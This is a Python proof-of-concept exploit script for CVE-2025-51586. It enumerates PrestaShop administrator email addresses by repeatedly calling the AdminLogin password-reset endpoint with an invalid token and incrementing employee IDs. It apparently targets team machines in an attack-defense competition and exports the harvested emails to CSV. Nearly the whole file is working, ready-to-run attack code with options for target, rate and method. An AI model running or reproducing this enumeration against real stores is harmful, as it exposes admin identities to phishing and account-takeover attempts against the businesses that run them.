#!/usr/bin/env python3
"""
CVE-2025-51586 PrestaShop AdminLogin email enumeration (PoC)

Enumerates administrator emails via the AdminLogin password reset endpoint
for PrestaShop 1.7.x through 8.2.2.
"""

import argparse
import csv
import re
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterable, List, Optional
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

ROOT_DIR = Path(__file__).resolve().parents[1]
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from lib.common import resolve_team_numbers
from lib.operations import TARGETS, Target


EMAIL_PATTERN = re.compile(
    r"name=[\"']reset_email[\"']\s+value=[\"']([^\"']+)[\"']",
    re.IGNORECASE,
)


@dataclass
class EnumResult:
    team: int
    target: str
    url: str
    employee_id: int
    email: str


def parse_targets(choice: str) -> List[Target]:
    choice = choice.strip().lower()
    if choice in ("all", ""):
        return list(TARGETS)
    if choice == "linux":
        return [t for t in TARGETS if t.os_type == "linux"]
    if choice == "windows":
        return [t for t in TARGETS if t.os_type == "windows"]
    requested = [token.strip().lower() for token in choice.split(",") if token.strip()]
    known = {t.hostname.lower(): t for t in TARGETS}
    unknown = sorted(set(requested) - set(known.keys()))
    if unknown:
        raise ValueError(f"Unknown targets: {', '.join(unknown)}")
    return [known[name] for name in requested]


def build_target_url(target: Target, team: int, scheme: str, path: str) -> str:
    if not path.startswith("/"):
        path = f"/{path}"
    return f"{scheme}://{target.wan_ip(team)}{path}"


def extract_email(body: str) -> Optional[str]:
    match = EMAIL_PATTERN.search(body)
    if not match:
        return None
    return match.group(1).strip()


def request_reset(
    url: str,
    employee_id: int,
    reset_token: str,
    method: str,
    timeout: int,
) -> Optional[str]:
    payload = {
        "id_employee": str(employee_id),
        "reset_token": reset_token,
    }
    if method == "GET":
        query = urlencode(payload)
        request_url = f"{url}&{query}" if "?" in url else f"{url}?{query}"
        request = Request(request_url)
        with urlopen(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", errors="ignore")
        return extract_email(body)

    data = urlencode(payload).encode("utf-8")
    request = Request(url, data=data, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urlopen(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="ignore")
    return extract_email(body)


def enumerate_target(
    url: str,
    start_id: int,
    end_id: int,
    reset_token: str,
    method: str,
    delay: float,
    timeout: int,
) -> Dict[int, str]:
    results: Dict[int, str] = {}
    for employee_id in range(start_id, end_id + 1):
        try:
            email = request_reset(url, employee_id, reset_token, method, timeout)
        except (HTTPError, URLError, TimeoutError):
            continue
        if email:
            results[employee_id] = email
        if delay:
            time.sleep(delay)
    return results


def run_enumeration(
    teams: Iterable[int],
    targets: List[Target],
    scheme: str,
    path: str,
    start_id: int,
    end_id: int,
    method: str,
    reset_token: str,
    delay: float,
    timeout: int,
    export_path: Optional[Path] = None,
) -> List[EnumResult]:
    method = method.upper()
    if method not in ("GET", "POST"):
        raise ValueError("method must be GET or POST")

    findings: List[EnumResult] = []
    for team in teams:
        for target in targets:
            url = build_target_url(target, team, scheme, path)
            results = enumerate_target(url, start_id, end_id, reset_token, method, delay, timeout)
            for employee_id, email in results.items():
                findings.append(
                    EnumResult(
                        team=team,
                        target=target.hostname,
                        url=url,
                        employee_id=employee_id,
                        email=email,
                    )
                )

    if export_path:
        export_path.parent.mkdir(parents=True, exist_ok=True)
        with export_path.open("w", newline="", encoding="utf-8") as handle:
            writer = csv.writer(handle)
            writer.writerow(["team", "target", "url", "id_employee", "email"])
            for entry in findings:
                writer.writerow([entry.team, entry.target, entry.url, entry.employee_id, entry.email])

    return findings


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Enumerate PrestaShop admin emails via CVE-2025-51586.",
    )
    parser.add_argument("--teams-count", type=int, help="Number of teams playing")
    parser.add_argument("--teams", help="Team range (e.g., '1-12' or '1,3,5').")
    parser.add_argument("--targets", default="storage", help="all, linux, windows, or comma-separated hostnames")
    parser.add_argument("--scheme", default="http", help="http or https")
    parser.add_argument(
        "--path",
        default="/admin/index.php?controller=AdminLogin&reset=1",
        help="Reset endpoint path",
    )
    parser.add_argument("--start-id", type=int, default=1, help="Starting id_employee to test")
    parser.add_argument("--end-id", type=int, default=100, help="Ending id_employee to test")
    parser.add_argument("--method", default="POST", help="HTTP method: GET or POST")
    parser.add_argument("--reset-token", default="invalidtoken123", help="Reset token to send")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout (seconds)")
    parser.add_argument("--export", type=Path, help="Export CSV results to this file")
    args = parser.parse_args()

    teams = resolve_team_numbers(args.teams, args.teams_count)
    targets = parse_targets(args.targets)

    findings = run_enumeration(
        teams,
        targets,
        args.scheme,
        args.path,
        args.start_id,
        args.end_id,
        args.method,
        args.reset_token,
        args.delay,
        args.timeout,
        args.export,
    )

    if findings:
        for entry in findings:
            print(
                f"[+] Team {entry.team} {entry.target} id={entry.employee_id} -> {entry.email} ({entry.url})"
            )
        return 0

    print("[-] No admin emails enumerated.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
